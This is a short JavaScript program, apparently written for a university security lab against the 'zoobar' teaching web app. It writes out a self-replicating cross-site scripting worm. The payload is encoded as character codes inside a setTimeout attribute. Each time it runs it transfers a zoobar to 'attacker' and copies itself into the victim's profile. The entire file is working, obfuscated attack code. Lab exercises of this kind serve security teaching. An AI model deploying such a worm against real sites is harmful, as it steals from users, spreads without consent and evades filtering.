
function inject() {
  var injection = "$.ajax({\
    type: 'POST',\
    data: {\
      name: 'attacker',\
      amount: '1'\
    },\
    url: 'http://zoobar.org:5000/transfer'\
  });\
  $.ajax({\
    type: 'POST',\
    data: {\
      profile: $('#zoobars')[0].outerHTML\
    },\
    url: 'http://zoobar.org:5000/update'\
  });";
  return toCharCodes(injection);
}

function toCharCodes (s) {
  var ascii_codes, i
  ascii_codes = [];
  for (i = 0; i < s.length; i++) {
    ascii_codes.push(s.charCodeAt(i));
  }
  return ascii_codes;
}

process.stdout.write('<div id="zoobars" class="setTimeout(String.fromCharCode(');
process.stdout.write( String(inject()) );
process.stdout.write('),0)"></div>\n');
